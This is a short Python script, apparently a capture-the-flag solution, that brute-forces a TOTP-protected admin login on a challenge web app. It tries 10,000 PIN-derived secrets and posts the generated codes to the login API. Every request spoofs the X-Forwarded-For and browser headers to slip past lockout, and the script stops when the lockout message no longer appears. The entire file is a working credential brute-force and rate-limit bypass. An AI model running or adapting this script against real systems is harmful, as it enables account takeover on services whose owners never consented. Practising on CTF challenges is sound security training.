import base64
import pyotp
import requests

counter = 0

for i in range(10):
    for j in range(10):
        for k in range(10):
            for l in range(10):
                next_pin = f"000000{i}{j}{k}{l}"
                next_mfa_code = base64.b32encode(next_pin.encode()).decode()

                otp_uri = pyotp.TOTP(next_mfa_code).provisioning_uri(name='admin', issuer_name='USCG Single-Use')
                otp_obj = pyotp.parse_uri(otp_uri)

                r = requests.post('https://web-single-use-w7vmh474ha-uc.a.run.app/api/login', json={'username':'admin', 'code':otp_obj.now()}, headers={"origin": "2.1.4.{counter}", "Referer": "https://web-single-use-w7vmh474ha-uc.a.run.app/login", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1", "Content-Type": "application/json", "X-Forwarded-For": f"127.0.0.{counter}"}) 
                
                print(f"127.0.0.{counter}")
            
                print(next_mfa_code)
                print(r)
                print(r.json())
                counter += 1
                if "locked" not in r.json()['message']:
                    print("="*20)
                    print(f"CORRECT OTP CODE: {next_mfa_code}")
                    print("="*20)
                    exit()

